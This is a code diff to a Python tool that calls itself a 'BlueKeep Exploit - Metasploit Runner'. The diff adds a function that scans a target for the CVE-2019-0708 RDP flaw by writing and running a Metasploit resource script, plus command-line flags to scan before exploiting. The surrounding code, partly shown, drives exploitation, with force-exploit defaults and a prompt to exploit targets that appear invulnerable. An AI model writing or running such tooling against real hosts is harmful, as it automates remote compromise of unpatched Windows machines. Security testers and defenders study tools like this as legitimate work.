@@ -70,6 +70,57 @@ def check_metasploit_installed():
     except:
         return False
 
+def run_vulnerability_scan(target_ip, target_port=3389, verbose=False):
+    """Run a vulnerability scan against the target using Metasploit."""
+    print(f"[*] Scanning {target_ip}:{target_port} for BlueKeep vulnerability...")
+    
+    # Create a temporary resource script for scanning
+    scan_script_name = f"bluekeep_scan_{random.randint(1000, 9999)}.rc"
+    
+    with open(scan_script_name, "w") as f:
+        f.write("use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\n")
+        f.write(f"set RHOSTS {target_ip}\n")
+        f.write(f"set RPORT {target_port}\n")
+        f.write("run\n")
+        f.write("exit\n")
+    
+    print("[*] Running vulnerability scan...")
+    cmd = ["msfconsole", "-q", "-r", scan_script_name]
+    
+    try:
+        process = subprocess.run(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        # Remove the resource script
+        if os.path.exists(scan_script_name):
+            os.remove(scan_script_name)
+        
+        # Check the output for vulnerability detection
+        output = process.stdout
+        if verbose:
+            print("[*] Scan output:")
+            print(output)
+        
+        if "VULNERABLE" in output:
+            print(f"[+] {target_ip}:{target_port} is VULNERABLE to BlueKeep!")
+            return True
+        elif "The target is not exploitable" in output:
+            print(f"[-] {target_ip}:{target_port} is NOT vulnerable to BlueKeep")
+            return False
+        else:
+            print(f"[?] Could not determine if {target_ip}:{target_port} is vulnerable")
+            return None
+    
+    except Exception as e:
+        print(f"[-] Error during vulnerability scan: {e}")
+        if os.path.exists(scan_script_name):
+            os.remove(scan_script_name)
+        return None
+
 def parse_arguments():
     parser = argparse.ArgumentParser(description="BlueKeep Exploit - Metasploit Runner")
     parser.add_argument("-i", "--rhost", required=True, help="Target IP address")
@@ -84,6 +135,8 @@ def parse_arguments():
                       help="Force exploitation even if target appears invulnerable (default: True)")
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
     parser.add_argument("-d", "--debug", action="store_true", help="Debug mode: Show extra diagnostic information")
+    parser.add_argument("-s", "--scan", action="store_true", help="Scan target for vulnerability before exploitation")
+    parser.add_argument("--scan-only", action="store_true", help="Only scan for vulnerability, don't exploit")
     return parser.parse_args()
 
 def main():
@@ -160,6 +213,20 @@ def main():
         print("[!] WARNING: Windows Server 2008 targets require fDisableCam=0 registry setting!")
     
     print()
+    
+    # Run vulnerability scan if requested
+    if args.scan or args.scan_only:
+        scan_result = run_vulnerability_scan(args.rhost, args.rport, args.verbose)
+        
+        if args.scan_only:
+            print("[*] Scan-only mode, exiting without exploitation")
+            return
+        
+        if scan_result is False and not args.force:
+            print("[-] Target appears to be not vulnerable. Use --force to exploit anyway.")
+            if input("Continue with exploitation anyway? (y/n): ").lower() != 'y':
+                print("[*] Exiting without exploitation")
+                return
     
     try:
         # Generate the resource script
